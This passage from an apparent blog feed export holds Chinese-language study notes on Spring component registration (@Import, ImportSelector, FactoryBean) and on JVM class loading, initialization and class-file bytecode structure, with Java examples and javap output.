@Bean(&quot;bill&quot;) public Person person01() { return new Person(&quot;Bill Gates&quot;, 60); } @Conditional({LinuxCondition.class}) @Bean(&quot;linux&quot;) public Person person02() { return new Person(&quot;linus&quot;, 45); }} 测试 @Testpublic void test04() { AnnotationConfigApplicationContext applicationContext = new AnnotationConfigApplicationContext(MainConfig2.class); // 获取环境变量 ConfigurableEnvironment environment = applicationContext.getEnvironment(); String property = environment.getProperty(&quot;os.name&quot;); System.out.println(property); // 获取所有bean定义的名字 String[] beanNames = applicationContext.getBeanDefinitionNames(); for (String name : beanNames) { System.out.println(name); } // key 是id Map&lt;String, Person&gt; map = applicationContext.getBeansOfType(Person.class); System.out.println(map);} 发现只有“bill”这个Bean被注入 Windows 7org.springframework.context.annotation.internalConfigurationAnnotationProcessororg.springframework.context.annotation.internalAutowiredAnnotationProcessororg.springframework.context.annotation.internalRequiredAnnotationProcessororg.springframework.context.annotation.internalCommonAnnotationProcessororg.springframework.context.event.internalEventListenerProcessororg.springframework.context.event.internalEventListenerFactorymainConfig2bill{bill=Person(name=Bill Gates, age=60)} 组件注册@Improt给容器中快速导入一个组件@Import导入 @Import可以导入第三方包，或则自己写的类，比较方便，Id默认为全类名 比如我们新建一个类 /** * @Author: cuzz * @Date: 2018/9/23 21:08 * @Description: */public class Color {} 我们只需要在配置类添加一个@Import把这个类导入 @Import({Color.class})@Configurationpublic class MainConfig2 {} ImportSelector接口导入的选择器 返回导入组件需要的全类名的数组 public interface ImportSelector { /** * Select and return the names of which class(es) should be imported based on * the {@link AnnotationMetadata} of the importing @{@link Configuration} class. */ String[] selectImports(AnnotationMetadata importingClassMetadata);} 编写一个MyImportSelector类实现ImportSelector接口 /** * @Author: cuzz * @Date: 2018/9/23 21:15 * @Description: */public class MyImportSelector implements ImportSelector{ // 返回值就导入容器组件的全类名 // AnnotationMetadata:当前类标注的@Import注解类的所有注解信息 @Override public String[] selectImports(AnnotationMetadata importingClassMetadata) { return new String[] {&quot;com.cuzz.bean.Car&quot;}; }} 在配置类中，通过@Import导入 /** * @Author: cuzz * @Date: 2018/9/23 15:40 * @Description: 配置类 */@Import({Color.class, MyImportSelector.class})@Configurationpublic class MainConfig2 {} 测试结果，com.cuzz.bean.Car注入了 org.springframework.context.annotation.internalConfigurationAnnotationProcessororg.springframework.context.annotation.internalAutowiredAnnotationProcessororg.springframework.context.annotation.internalRequiredAnnotationProcessororg.springframework.context.annotation.internalCommonAnnotationProcessororg.springframework.context.event.internalEventListenerProcessororg.springframework.context.event.internalEventListenerFactorymainConfig2com.cuzz.bean.Colorcom.cuzz.bean.Car ImportBeanDefinitionRegistrar接口选择器 public interface ImportBeanDefinitionRegistrar { /** * Register bean definitions as necessary based on the given annotation metadata of * the importing {@code @Configuration} class. * &lt;p&gt;Note that {@link BeanDefinitionRegistryPostProcessor} types may &lt;em&gt;not&lt;/em&gt; be * registered here, due to lifecycle constraints related to {@code @Configuration} * class processing. * @param importingClassMetadata annotation metadata of the importing class * @param registry current bean definition registry */ public void registerBeanDefinitions( AnnotationMetadata importingClassMetadata, BeanDefinitionRegistry registry);} 编写一个ImportBeanDefinitionRegistrar实现类 /** * @Author: cuzz * @Date: 2018/9/23 21:29 * @Description: */public class MyImportBeanDefinitionRegistrar implements ImportBeanDefinitionRegistrar { /** * @param importingClassMetadata 当前类的注解信息 * @param registry 注册类 */ @Override public void registerBeanDefinitions(AnnotationMetadata importingClassMetadata, BeanDefinitionRegistry registry) { // 查询容器 boolean b = registry.containsBeanDefinition(&quot;com.cuzz.bean.Car&quot;); // 如果有car, 注册一个汽油类 if (b == true) { // 需要添加一个bean的定义信息 RootBeanDefinition rootBeanDefinition = new RootBeanDefinition(Petrol.class); // 注册一个bean, 指定bean名 registry.registerBeanDefinition(&quot;petrol&quot;, rootBeanDefinition); } }} 配置类 /** * @Author: cuzz * @Date: 2018/9/23 15:40 * @Description: 配置类 */@Import({Color.class, MyImportSelector.class, MyImportBeanDefinitionRegistrar.class})@Configurationpublic class MainConfig2 {} 测试结果，出现了petrol org.springframework.context.annotation.internalConfigurationAnnotationProcessororg.springframework.context.annotation.internalAutowiredAnnotationProcessororg.springframework.context.annotation.internalRequiredAnnotationProcessororg.springframework.context.annotation.internalCommonAnnotationProcessororg.springframework.context.event.internalEventListenerProcessororg.springframework.context.event.internalEventListenerFactorymainConfig2com.cuzz.bean.Colorcom.cuzz.bean.Car petrol 组件注册使用FactoryBean注册组件编写一个ColorFactoryBean类 /** * @Author: cuzz * @Date: 2018/9/23 21:55 * @Description: Spring定义的工厂Bean */public class ColorFactoryBean implements FactoryBean&lt;Color&gt; { // 返回一个Color对象 @Override public Color getObject() throws Exception { return new Color(); } @Override public Class&lt;?&gt; getObjectType() { return Color.class; } // 是否为单例 @Override public boolean isSingleton() { return true; }} 注入到容器中 @Beanpublic ColorFactoryBean colorFactoryBean() { return new ColorFactoryBean();} 测试 @Testpublic void test05() { AnnotationConfigApplicationContext applicationContext = new AnnotationConfigApplicationContext(MainConfig2.class); Object bean = applicationContext.getBean(&quot;colorFactoryBean&quot;); // 工厂bean调用的是getClass()方法 System.out.println(&quot;colorFactoryBean的类型是: &quot; + bean.getClass());} 输出，发现此时的bean调用的方法是getObjectType方法 colorFactoryBean的类型是: class com.cuzz.bean.Color 如果需要获取BeanFactory本身，可以在id前面加一个“&amp;”标识 @Testpublic void test05() { AnnotationConfigApplicationContext applicationContext = new AnnotationConfigApplicationContext(MainConfig2.class); Object bean = applicationContext.getBean(&quot;colorFactoryBean&quot;); // 工厂bean调用的是getClass()方法 System.out.println(&quot;colorFactoryBean的类型是: &quot; + bean.getClass()); Object bean2 = applicationContext.getBean(&quot;&amp;colorFactoryBean&quot;); // 工厂bean调用的是getClass()方法 System.out.println(&quot;colorFactoryBean的类型是: &quot; + bean2.getClass());} 此时输出 colorFactoryBean的类型是: class com.cuzz.bean.ColorcolorFactoryBean的类型是: class com.cuzz.bean.ColorFactoryBean 总结给容器中注册组件： 包扫描 + 组件组件（@Controller / @Service / @Repository / @Component） @Bean[导入第三方包组件] @Import[快速给容器中导入一个组件] @Import（要导入到容器中的组件），容器中就会自动注册这个组件，id 默认是全类名 ImportSelector，返回需要导入的组件的全类名数组 ImportBeanDefinitionRegistrar，手动注册bean到容器中 使用 Spring 提供的 FactoryBean （工厂Bean） 默认获取到的是工厂 bean 调用的 getObject 创建的对象 要获取工厂 Bean 本身，我们需要个 id 前面加一个 &amp; 符号，如 &amp;colorFactoryBean","link":"/2018/09/23/Spring%E6%B3%A8%E8%A7%A3%E9%A9%B1%E5%8A%A8%E5%BC%80%E5%8F%91%EF%BC%88%E4%B8%80%EF%BC%89/"},{"title":"深入理解Java虚拟机（一）","text":"类加载机制在 Java 代码中，类型（类，接口，枚举）的加载、连接（验证，准备，解析）与初始化过程都是在程序运行期间完成的，提供了更大的灵活性，增加了更多的可能性 类加载器深入剖析Java 虚拟机与程序的生命周期 在如下几种情况下，Java 虚拟机将结束生命周期 执行了 System.exit() 方法 程序正常执行结束 程序在执行的过程中遇到了异常或则错误而异常终止 由于操作系统出现了错误，导致 Java 虚拟机进程结束 类的加载、连接与初始化 加载：查找并加载类的二进制数据 连接 验证：确保被加载的类的正确性 准备：为类的静态变量分配内存，并将其初始化为默认值 解析：把类中的符号引用转化为直接引用 初始化：为静态变量赋予正确的初始值 使用（类的实例化）： 为新的对象分配内存 为实例变量赋默认值 为实例变量赋予正确的初始值 Java 编译器为它编译的每一个类都至少生成一个实例初始化方法，在 Java 的 class 文件中，这这实例初始方法被称为 &lt;init&gt; ，对源代码中的每一个类的构造方法，java 编译器都产生一个 &lt;init&gt; 方法 Java 程序对类的使用方式可以分为两种： 主动使用 创建类的实例 访问某个类或接口的静态变量，或则对该静态变量赋值 调用类的静态方法 反射（如 Class.forName(&quot;com.cuzz.Test&quot;)） 初始化一个子类 Java 虚拟机启动时被标明为启动类的类 被动使用 所有的 Java 虚拟机实现必须在每个类或接口被 Java 程序首次主动使用时才初始化他们 我们来看一段代码 public class MyTest01 { public static void main(String[] args) { System.out.println(Child1.str); }}class Parent1 { public static String str = &quot;hello world&quot;; static { System.out.println(&quot;Parent1 static block&quot;); }}class Child1 extends Parent1 { static { System.out.println(&quot;Child1 static block&quot;); }} 输出 Parent1 static blockhello world 对于静态代码块，只有定义该字段的类才会被初始化，这个 Child1.str 是子类调用父类的静态字段，所以子类不会被初始化，父类才会被初始化，这是对 Parent1 的主动使用，对于这个例子只是用了 Child1 的名字，并没有主动使用 Child1 这个类 我们在来看看有没有被加载到虚拟机中，在 VM options : -XX:+TraceClassLoading 在运行 ...[Loaded com.cuzz.jvm.classloader.Parent1 from file:/E:/project/learn-demo/demo-10-jvm-lecture/out/production/classes/][Loaded com.cuzz.jvm.classloader.Child1 from file:/E:/project/learn-demo/demo-10-jvm-lecture/out/production/classes/]Parent1 static blockhello world[Loaded java.lang.Shutdown from E:\\deployer\\jdk8\\jre\\lib\\rt.jar][Loaded java.lang.Shutdown$Lock from E:\\deployer\\jdk8\\jre\\lib\\rt.jar] 发现这两个类已经被加载到虚拟中 再看一个例子 public class MyTest01 { public static void main(String[] args) { System.out.println(Child1.str2); }}class Parent1 { public static String str = &quot;hello world&quot;; static { System.out.println(&quot;Parent1 static block&quot;); }}class Child1 extends Parent1 { public static String str2 = &quot;welcome&quot;; static { System.out.println(&quot;Child1 static block&quot;); }} 输出 Parent1 static blockChild1 static blockwelcome 当我们初始一个子类，我们会先初始化父类，所以会线输出父类的静态代码块 如果我们加上 final 变为常量 /** * @Author: cuzz * @Date: 2019/1/25 19:16 * @Description: */public class MyTest02 { public static void main(String[] args) { System.out.println(Parent2.str); }}class Parent2 { public static final String str = &quot;hello world&quot;; static { System.out.println(&quot;Parent2 static block&quot;); }} 输出 hello world 常量在编译阶段会存入到调用这个常量的方法所在的类的常量池中（也就是说会存入MyTest02这个类中），本质上，调用类并没有直接引用到定义常量的类，因此并不会触发定义常量的类的初始化 注意：这里指的是将常量存放到了 MyTest02 的常量池中，之后 MyTest02 与 Parent2 就没有任何关系了，甚至我们可以将 Parent 的 class 文件删除 我们进入 classes 目录下使用：javap -c com.cuzz.jvm.classloader.MyTest02 命令反编译一下 Compiled from &quot;MyTest02.java&quot;public class com.cuzz.jvm.classloader.MyTest02 { public com.cuzz.jvm.classloader.MyTest02();// (1) Code: 0: aload_0 1: invokespecial #1 // Method java/lang/Object.&quot;&lt;init&gt;&quot;:()V 4: return public static void main(java.lang.String[]); Code: 0: getstatic #2 // Field java/lang/System.out:Ljava/io/PrintStream; 3: ldc #4 (2) // String hello world (3) 5: invokevirtual #5 // Method java/io/PrintStream.println:(Ljava/lang/String;)V 8: return} 是构造方法 ldc 助记符表示将 int，float 或 String 类型的值从常量池中推送至栈顶 可以看出Parent2.str 已经转化为 hello world 注：当 int 取值-15采用iconst指令，取值-128127采用 bipush 指令，取值-3276832767采用 sipush 指令，取值-21474836482147483647采用 ldc 指令 我们在看一个例子 public class MyTest03 { public static void main(String[] args) { System.out.println(Parent3.str); }}class Parent3 { public static final String str = UUID.randomUUID().toString(); static { System.out.println(&quot;Parent3 static block&quot;); }} 输出 Parent3 static blockbee2f54d-8960-46d0-b5d7-02666fcf4a14 相比于上一个例子，我们发现输出了静态代码块，说明 Parent3 这个类被初始化了，当一个常量的值并非编译期间可以确定的，那么器值就不会放到调用类的常量池中，这是在程序运行时，会导致主动使用这个常量所在的类，会导致这给类初始化 再看一个例子 public class MyTest04 { public static void main(String[] args) { Parent4[] parent4s = new Parent4[1]; System.out.println(&quot;---------&quot;); System.out.println(parent4s.getClass()); System.out.println(parent4s.getClass().getSuperclass()); System.out.println(&quot;---------&quot;); int[] ints = new int[1]; System.out.println(ints.getClass()); System.out.println(ints.getClass().getSuperclass()); }}class Parent4 { static { System.out.println(&quot;Parent4 static block&quot;); }} 输出 ---------class [Lcom.cuzz.jvm.classloader.Parent4;class java.lang.Object---------class [Iclass java.lang.ObjectProcess finished with exit code 0 对于数组实例来说，其类型是由 JVM 在运行期动态生成的，表示为 [Lcom.cuzz.jvm.classloader.Parent4 这种形式，动态生成的类型，其父类型就是 Object 对于数组来说，JavaDoc 经常将构成的数组元素称为 Component，实际上就是将数组降低一个维度的类型 我们使用 javap -c com.cuzz.jvm.classloader.MyTest04 进行反编译 public class com.cuzz.jvm.classloader.MyTest04 { public com.cuzz.jvm.classloader.MyTest04(); Code: 0: aload_0 1: invokespecial #1 // Method java/lang/Object.&quot;&lt;init&gt;&quot;:()V 4: return public static void main(java.lang.String[]); Code: 0: iconst_1 1: anewarray #2 // class com/cuzz/jvm/classloader/Parent4 4: astore_1 5: getstatic #3 // Field java/lang/System.out:Ljava/io/PrintStream; 8: ldc #4 // String --------- 10: invokevirtual #5 // Method java/io/PrintStream.println:(Ljava/lang/String;)V 13: getstatic #3 // Field java/lang/System.out:Ljava/io/PrintStream; 16: aload_1 17: invokevirtual #6 // Method java/lang/Object.getClass:()Ljava/lang/Class; 20: invokevirtual #7 // Method java/io/PrintStream.println:(Ljava/lang/Object;)V 23: getstatic #3 // Field java/lang/System.out:Ljava/io/PrintStream; 26: aload_1 27: invokevirtual #6 // Method java/lang/Object.getClass:()Ljava/lang/Class; 30: invokevirtual #8 // Method java/lang/Class.getSuperclass:()Ljava/lang/Class; 33: invokevirtual #7 // Method java/io/PrintStream.println:(Ljava/lang/Object;)V 36: getstatic #3 // Field java/lang/System.out:Ljava/io/PrintStream; 39: ldc #4 // String --------- 41: invokevirtual #5 // Method java/io/PrintStream.println:(Ljava/lang/String;)V 44: iconst_1 45: newarray int 47: astore_2 48: getstatic #3 // Field java/lang/System.out:Ljava/io/PrintStream; 51: aload_2 52: invokevirtual #6 // Method java/lang/Object.getClass:()Ljava/lang/Class; 55: invokevirtual #7 // Method java/io/PrintStream.println:(Ljava/lang/Object;)V 58: getstatic #3 // Field java/lang/System.out:Ljava/io/PrintStream; 61: aload_2 62: invokevirtual #6 // Method java/lang/Object.getClass:()Ljava/lang/Class; 65: invokevirtual #8 // Method java/lang/Class.getSuperclass:()Ljava/lang/Class; 68: invokevirtual #7 // Method java/io/PrintStream.println:(Ljava/lang/Object;)V 71: return} 里面有两个助记符 anewarray ：表示创建一个引用类型的（如类、接口、数组）数组，并将其值压入栈顶 newarray：表示创建一个指定的原始类型（如int、float、char等）数组，并将其引用值压入栈顶 下一个例子 public class MyTest05 { public static void main(String[] args) { System.out.println(Child5.j); }}interface Parent5 { int i = 5;}interface Child5 extends Parent5 { int j = 55;} 编译之后我们把 Parent5.class 文件删掉，还能打印出 55，说明当一个接口在初始化时，并不要求其父接口都完成初始化，如果我们把 Child5.class 文件也删掉，也能打印出 55，原来接口中的修饰符默认为 public static final 说明接口中的值是一个常量，不需要加载到 JVM 中，也就没有初始化。 public class MyTest05 { public static void main(String[] args) { System.out.println(Child5.j); }}interface Parent5 { public static Thread thread = new Thread() { { System.out.println(&quot;Parent5 static block&quot;); } };}class Child5 implements Parent5 { public static int j = 55;} 此时也也是输出 55 ，也没有初始化 Child5 接口 Parent5 下一例子 public class MyTest06 { public static void main(String[] args) { Singleton singleton = Singleton.newSingleton(); System.out.println(Singleton.counter1); System.out.println(Singleton.counter2); }}class Singleton { public static int counter1; private static Singleton singleton = new Singleton(); private Singleton() { counter1++; // counter1 = 1 counter2++; // counter2 = 1 } public static int counter2 = 0; // 此时又把值赋值为 0 public static Singleton newSingleton() { return singleton; }} 此时输出 10 为什么会这样呢，准备阶段 counter1 和 counter2 的初始值都是 0 ，初始化阶段从上往下赋值，后面 counter2 又赋值为 0 我们再来回顾一下 public class MyTest09 { static { System.out.println(&quot;MyTest09 static block&quot;); } public static void main(String[] args) { System.out.println(Child9.j); }}class Parent9 { public static int i = 9; static { System.out.println(&quot;Parent9 static block&quot;); }}class Child9 extends Parent9 { public static int j = 99; static { System.out.println(&quot;Child9 static block&quot;); }} 输出 MyTest09 static blockParent9 static blockChild9 static block99 我们多输出点信息 public class MyTest09 { static { System.out.println(&quot;MyTest09 static block&quot;); } public static void main(String[] args) { Parent9 parent9; // 不会初始化 System.out.println(&quot;-------------&quot;); parent9 = new Parent9(); System.out.println(&quot;-------------&quot;); System.out.println(Parent9.i); System.out.println(&quot;-------------&quot;); System.out.println(Child9.j); }}class Parent9 { public static int i = 9; static { System.out.println(&quot;Parent9 static block&quot;); }}class Child9 extends Parent9 { public static int j = 99; static { System.out.println(&quot;Child9 static block&quot;); }} 输出结果 MyTest09 static block-------------Parent9 static block-------------9-------------Child9 static block99 在看一个例子 public class MyTest12 { public static void main(String[] args) throws Exception{ ClassLoader classLoader = ClassLoader.getSystemClassLoader(); Class&lt;?&gt; clazz = classLoader.loadClass(&quot;com.cuzz.jvm.classloader.CL&quot;); System.out.println(&quot;--------------&quot;); clazz = Class.forName(&quot;com.cuzz.jvm.classloader.CL&quot;); }}class CL { static { System.out.println(&quot;CL static block&quot;); }} 输出 --------------CL static block 说明调用 ClassLoader 类的 loadClass 方法加载一个类，并不是对类的主动使用，不会导致类的初始化，而通过 Class.forName 方法是通过反射机制，会对类初始化 类的加载类的加载是指将类的 .class 文件中的二进制数据读入到内存中，将其运行时数据区的方法区内，然后在内存中创建一个 java.lang.Class 对象（规范中并未说明Class对象位于哪里，HotSpot 虚拟机将其放在了方法区中）用来封装类在方法区内的数据结构 加载 .class 文件的方式 从本地系统中直接加载 .class 文件 通过网络下载的 .class 文件 从 zip，jar 等归档文件中加载 .class 文件 从专有数据库中提取 .class 文件 将 Java 源文件动态编译为 .class 文件 类的加载器 类的加载器分类： Java 虚拟机自带的加载器 根加载器（Bootstrap） 拓展类加载器（Extension） 应用加载器（Application） 用户自定义的类加载器 java.lang.ClassLoader 的子类 用户定制类的加载方法 注意：类的加载并不需要等到某个类被首次主动使用时再加载它；JVM 规范允许类加载器在预料某个类将要被使用时就预先加载它，如果在预先加载过程中遇到了 .class 文件缺失或存在错误，类加载器必须在程序首次主动使用该类才报告错误，如果这个类一直没有被程序主动使用，那么类加载器就不会报告错误 看一个例子 public class MyTest07 { public static void main(String[] args) throws Exception { Class&lt;?&gt; clazz = Class.forName(&quot;java.lang.String&quot;); System.out.println(clazz.getClassLoader()); Class&lt;?&gt; clazz1 = Class.forName(&quot;com.cuzz.jvm.classloader.C&quot;); System.out.println(clazz1.getClassLoader()); }}class C { } 输出 nullsun.misc.Launcher$AppClassLoader@dad5dc 看看 getClassLoader 的文档 Returns the class loader for the class. Some implementations may use null to represent the bootstrap class loader. This method will return null in such implementations if this class was loaded by the bootstrap class loader. 说明输出 null 说明 java.lang.String 是根加载器加载的 获取 ClassLoader 的途径 获得当前类 ClassLoader clazz.getClassLoader() 获得当前线程上下文的 ClassLoader Thread.currentThread().getContextClassLoader() 获取系统的 ClassLoader ClassLoader.getSystemClassLoader() 获取调用者的 ClassLoader DriverManger.getCallerClassLoader() 类的验证类的验证的内容： 类文件的结构检查 语义检查 字节码验证 二进制兼容性的验证 类的初始化时机当 Java 虚拟机在初始化一个类时，要求它的所有父类都已经被初始化，但是这条规则并不适用于接口 在初始化一个类时，并不会先初始化它所实现的接口 在初始化一个接口时，并不会先初始化它的父接口 因此，一个父接口并不会因为它的子接口或者实现类的初始化而初始化，只有当程序首次使用特定接口的静态变量时，才会导致该接口的初始化 JVM参数设置非稳态选项使用说明: -XX:+&lt;option&gt; 启用 option -XX:-&lt;option&gt; 不启用 option -XX:&lt;option&gt;=&lt;number&gt; 设定option的值为数字类型，可跟单位，例如 32k, 1024m, 2g -XX:&lt;option&gt;=&lt;string&gt; 设定option的值为字符串，例如-XX:HeapDumpPath=./dump.core","link":"/2019/01/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Java%E8%99%9A%E6%8B%9F%E6%9C%BA%EF%BC%88%E4%B8%80%EF%BC%89/"},{"title":"深入理解Java虚拟机（三）","text":"Java 字节码代码编译结果从本地机器码转变为字节码，是存储格式发展的一小步，确是编程语言发展的一大步。 字节码文件剖析我们从一段简单的代码来入手 public class MyTest01 { private int a = 0; public int getA() { return a; } public void setA(int a) { this.a = a; }} 我要要看一下 java 文件对应的 class 文件的结构，定位到工程的 out\\production\\classes 下边执行： javap -c com.cuzz.jvm.bytecode.Mytest01 警告: 二进制文件com.cuzz.jvm.bytecode.Mytest01包含com.cuzz.jvm.bytecode.MyTest01Compiled from &quot;MyTest01.java&quot;public class com.cuzz.jvm.bytecode.MyTest01 { public com.cuzz.jvm.bytecode.MyTest01(); Code: 0: aload_0 1: invokespecial #1 // Method java/lang/Object.&quot;&lt;init&gt;&quot;:()V 4: aload_0 5: iconst_0 6: putfield #2 // Field a:I 9: return public int getA(); Code: 0: aload_0 1: getfield #2 // Field a:I 4: ireturn public void setA(int); Code: 0: aload_0 1: iload_1 2: putfield #2 // Field a:I 5: return} 我们如果需要获得更多信息可以使用如下命令： javap -verbose com.cuzz.jvm.bytecode.Mytest01 警告: 二进制文件com.cuzz.jvm.bytecode.Mytest01包含com.cuzz.jvm.bytecode.MyTest01Classfile /E:/project/learn-demo/demo-10-jvm-lecture/out/production/classes/com/cuzz/jvm/bytecode/Mytest01.class Last modified 2019-2-3; size 492 bytes MD5 checksum cceeac51ae7b6fc46c60faf834de5932 Compiled from &quot;MyTest01.java&quot;public class com.cuzz.jvm.bytecode.MyTest01 minor version: 0 major version: 52 flags: ACC_PUBLIC, ACC_SUPERConstant pool: #1 = Methodref #4.#20 // java/lang/Object.&quot;&lt;init&gt;&quot;:()V #2 = Fieldref #3.#21 // com/cuzz/jvm/bytecode/MyTest01.a:I #3 = Class #22 // com/cuzz/jvm/bytecode/MyTest01 #4 = Class #23 // java/lang/Object #5 = Utf8 a #6 = Utf8 I #7 = Utf8 &lt;init&gt; #8 = Utf8 ()V #9 = Utf8 Code #10 = Utf8 LineNumberTable #11 = Utf8 LocalVariableTable #12 = Utf8 this #13 = Utf8 Lcom/cuzz/jvm/bytecode/MyTest01; #14 = Utf8 getA #15 = Utf8 ()I #16 = Utf8 setA #17 = Utf8 (I)V #18 = Utf8 SourceFile #19 = Utf8 MyTest01.java #20 = NameAndType #7:#8 // &quot;&lt;init&gt;&quot;:()V #21 = NameAndType #5:#6 // a:I #22 = Utf8 com/cuzz/jvm/bytecode/MyTest01 #23 = Utf8 java/lang/Object{ public com.cuzz.jvm.bytecode.MyTest01(); descriptor: ()V flags: ACC_PUBLIC Code: stack=2, locals=1, args_size=1 0: aload_0 1: invokespecial #1 // Method java/lang/Object.&quot;&lt;init&gt;&quot;:()V 4: aload_0 5: iconst_0 6: putfield #2 // Field a:I 9: return LineNumberTable: line 8: 0 line 10: 4 LocalVariableTable: Start Length Slot Name Signature 0 10 0 this Lcom/cuzz/jvm/bytecode/MyTest01; public int getA(); descriptor: ()I flags: ACC_PUBLIC Code: stack=1, locals=1, args_size=1 0: aload_0 1: getfield #2 // Field a:I 4: ireturn LineNumberTable: line 13: 0 LocalVariableTable: Start Length Slot Name Signature 0 5 0 this Lcom/cuzz/jvm/bytecode/MyTest01; public void setA(int); descriptor: (I)V flags: ACC_PUBLIC Code: stack=2, locals=2, args_size=2 0: aload_0 1: iload_1 2: putfield #2 // Field a:I 5: return LineNumberTable: line 17: 0 line 18: 5 LocalVariableTable: Start Length Slot Name Signature 0 6 0 this Lcom/cuzz/jvm/bytecode/MyTest01; 0 6 1 a I}SourceFile: &quot;MyTest01.java&quot; 我们也可以使用二进制文件查看器查看class文件的16进制信息（winhex下载）： 16文件查看器里边第一行的CA 就是一个字节的容量（8位bit）: 使用 javap -verbos 命令分析一个字节码文件时，将会分析该字节码文件的魔数、版本号、常量池、类信息、类的构造方法信息、类变量与成员变量等信息。 魔数：所有的.class字节码文件的前4个字节都是魔数，魔数值为固定值：0xCAFEBABE (詹姆斯.高斯林设计的，蕴意：咖啡宝贝，java 的图标是咖啡。 魔数之后的4个字节为版本信息，前2个字节表示 minor versio（次版本号），后两个字节表示 major version（主版本号）。 这里的版本号为 00 00 00 34，换算成十进制，表示次版本号为0，主版本号为52。 字节常量池剖析常量池（constant pool）：紧接着主版本号之后的就是常量池入口。一个 Java 类中定义的很多信息都是由常量池来维护和描述的，可以将常量池看作是 Class 文件的资源仓库，比如说 Java 类中定义的方法与变量信息，都是存储在常量池中。常量池中的主要储存两类常量：字面量与符号引用。字面量如文本字符串，Java 中声明为 final 的常量值等，而符号引用如类和接口的全局限定名，字段的名称和描述符，方法的名称和描述符等。 常量池的总体结构：Java 类所对应的常量池主要由常量池数量与常量池数组（常量表）这两部分共同构成。常量池数量紧跟在主版本号后面，占据 2 个字节；常量池数组紧跟在常量池数量之后。常量池数组与一般的数组不同的是，常量池数组中不同的元素类型、结构都是不同的，长度当然也就不同；但是，每一种元素的第一个数据都是一个 u1 类型，该字节是一个标志位，占据 1 个字节。JVM 在解析常量池时，会根据这个 u1 类型来获取元素的具体类型。 值得注意的是，常量池数组中元素的个数 = 常量池数 - 1 （其中0暂时不使用）。对应的是 00 18 转化为十进制为24个常量，而我们看到只有23个。目的是满足某些常量池索引值的数据在特定情况下需要表达“不引用任何一个常量”的含义；根本原因在于，索引 0 也是一个常量（保留常量），只不过它不位于常量表中，这个常量就对应 null 值，所以，常量池的索引从 1 开始而不是 0 。 Constant pool: #1 = Methodref #4.#20 // java/lang/Object.&quot;&lt;init&gt;&quot;:()V #2 = Fieldref #3.#21 // com/cuzz/jvm/bytecode/MyTest01.a:I #3 = Class #22 // com/cuzz/jvm/bytecode/MyTest01 #4 = Class #23 // java/lang/Object #5 = Utf8 a #6 = Utf8 I #7 = Utf8 &lt;init&gt; #8 = Utf8 ()V #9 = Utf8 Code #10 = Utf8 LineNumberTable #11 = Utf8 LocalVariableTable #12 = Utf8 this #13 = Utf8 Lcom/cuzz/jvm/bytecode/MyTest01; #14 = Utf8 getA #15 = Utf8 ()I #16 = Utf8 setA #17 = Utf8 (I)V #18 = Utf8 SourceFile #19 = Utf8 MyTest01.java #20 = NameAndType #7:#8 // &quot;&lt;init&gt;&quot;:()V #21 = NameAndType #5:#6 // a:I #22 = Utf8 com/cuzz/jvm/bytecode/MyTest01 #23 = Utf8 java/lang/Object Class 文件结构中常量池数据类型的结构表 在 JVM 规范中，每一个变量/字段都有描述信息，描述信息主要的作用是描述字段的数据类型、方法的参数列表（包括数量、类型与顺序）与返回值。根据描述符规则，基本数据类型和代表无返回的 void 类型都是用一个大写字符来表示，对象类型则使用字符 L 加对象的全限定名称来表示。为了压缩字节码文件的体积，对于基本数据类型，JVM 都只使用一个大写字母来表示，如下所示：B - byte，C - char，D - double，F - float，I - int，J - long，S - short，Z - boolean，V - void，L - 对象类型，如 Ljava/lang/String;。 对于数组类型来说，没一个维度使用前置 [ 来表示，如 int [] 被记录为 [I ，String[][] 被记录为 [[Ljava/lang/String;。 用描述符描述方法时，按照先参数列表，后返回值的顺序来描述。参数列表按照参数的严格顺序放在一组括号内，如方法：String getRealNameByIdAndNickName(int id, String name) 的描述符为：(I, Ljava/lang/String;) Ljava/lang/String; 我们来分析前面几个常量，如图： 我反编译出来的文件对比： Constant pool: #1 = Methodref #4.#20 // java/lang/Object.&quot;&lt;init&gt;&quot;:()V #2 = Fieldref #3.#21 // com/cuzz/jvm/bytecode/MyTest01.a:I #3 = Class #22 // com/cuzz/jvm/bytecode/MyTest01 #4 = Class #23 // java/lang/Object #5 = Utf8 a #6 = Utf8 I #7 = Utf8 &lt;init&gt; #8 = Utf8 ()V #9 = Utf8 Code#10 = Utf8 LineNumberTable#11 = Utf8 LocalVariableTable#12 = Utf8 this#13 = Utf8 Lcom/cuzz/jvm/bytecode/MyTest01;#14 = Utf8 getA#15 = Utf8 ()I#16 = Utf8 setA#17 = Utf8 (I)V#18 = Utf8 SourceFile#19 = Utf8 MyTest01.java#20 = NameAndType #7:#8 // &quot;&lt;init&gt;&quot;:()V#21 = NameAndType #5:#6 // a:I#22 = Utf8 com/cuzz/jvm/bytecode/MyTest01#23 = Utf8 java/lang/Object 0A 00 04 00 14，如图中的标注出来，0A 对应值为10，在上表的常量中 CONSTANT_Methodref_info 中，那么后边的2个字节 00 04 （十进制4）就是 U2（第一个index），即指向声明方法的类描述符 CONSTANT_Class_info 的索引项，而第二个索引（第二个index）00 14（十进制20） 指向名称及类型描述符 CONSTANT_NameAndType_info 的索引项。类描述指向 #4 ，#4 又指向 #23，所以描述为 java/lang/Object，而名称以及类型描述符指向 #20，#20 有指向 #7 和 #8，&quot;&lt;init&gt;&quot;:()V 表示为构造方法。 09 00 03 00 15 ，09 是标志位对用的是 CONSTANT_Fieldref_info，第一个索引指向的是声明字段的类或接口描述符，CONSTANT_Class_info 的索引项，根上面一样分析。 07 00 16 ， 00 16 十进制是22 ，07是常量 CONSTANT_CLass_info，只有一个index，指向的是指定权限定名常量项的索引， 00 16 是十进制22。 07 00 17 ，07是常量 CONSTANT_CLass_info，只有一个index，指向的是指定权限定名常量项的索引，00 17 十进制是23。 01 00 01 61，01 是 CONSTANT_Utf8_info，后面 00 01 这两个字节表示长度，最后 61 （十进制为97）的表示 ASCII 中带索引，在 ASCII 中为字母 a。 01 00 01 为 I。 等等 Java 字节码结构 Class 字节码中有两种数据类型 字节数据直接量：这是基本的数据类型，共细分为 u1、u2、u4、u8 这四种，分别代表连续的 1 个字节、2 个字节、4 个字节和8 个字节。 表（数组）：表示有多个基本数据或其他表，按照既定顺序组成的大的数据集合。表示有结构的，它的结构体现在，组成表的成分所在的位置和顺序都已经严格定义好的。 访问标志访问标志（Access_Flag）信息包括该 Class 文件是类还是接口，是否被定义成 public，是否是 abstract，如果是类，是否被声明成 final。通过上面的源代码，我们可以知道该文件是类并且是 public。 常量池之后两个字节就是访问标志，我们这个类中是 0x 00 21 ，从上面来看并没有，原来它是 0x 00 20 和 0x 00 01 